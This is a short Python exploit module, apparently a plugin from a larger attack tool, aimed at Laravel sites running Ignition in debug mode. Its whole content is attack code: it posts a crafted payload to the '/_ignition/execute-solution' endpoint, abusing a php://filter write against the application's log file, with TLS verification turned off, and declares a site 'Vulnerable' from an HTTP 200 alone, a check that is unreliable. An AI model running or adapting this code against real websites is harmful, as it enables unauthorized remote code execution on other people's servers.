import requests
from core.printmodels import *
import base64

class Laravel_Debug_RCE:
    def __init__(self):
        self.name = "Laravel Debug Mode RCE"
        self.description = "Laravel Debug Mode Remote Code Execution"
        self.author = "Mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/_ignition/execute-solution"
            payload = {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                    "variableName": "username",
                    "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log",
                }
            }
            response = requests.post(endpoint, json=payload, verify=False, timeout=10)
            
            if response.status_code == 200:
                return PrintSuccess(f"[Laravel] Vulnerable! Debug mode RCE possible")
            return PrintFailed("[Laravel] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Laravel] Error: {str(e)}")
